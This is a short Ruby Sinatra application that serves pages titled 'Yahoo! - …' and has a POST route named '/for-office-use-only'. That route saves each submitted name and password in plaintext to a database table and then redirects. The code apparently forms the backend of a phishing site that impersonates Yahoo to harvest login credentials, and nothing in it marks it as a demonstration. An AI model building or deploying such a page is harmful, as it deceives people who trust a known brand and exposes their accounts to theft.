require 'sinatra'
require 'pg'

$db = PG.connect(dbname: 'the_office')

class TheOffice < Sinatra::Base

  def title
    "Yahoo! - #{@title}"
  end

  get '/style.css' do
    scss :style
  end

  get '/' do
    erb :homepage
  end

  post '/for-office-use-only' do
    $db.exec_params("
      INSERT INTO forms (name, password)
      VALUES ($1, $2)", [params[:name], params[:password]]
    )
    redirect '/'
  end

end
